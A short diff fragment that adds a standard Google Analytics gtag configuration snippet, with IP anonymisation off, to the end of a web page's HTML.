+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+</body>
+</html>
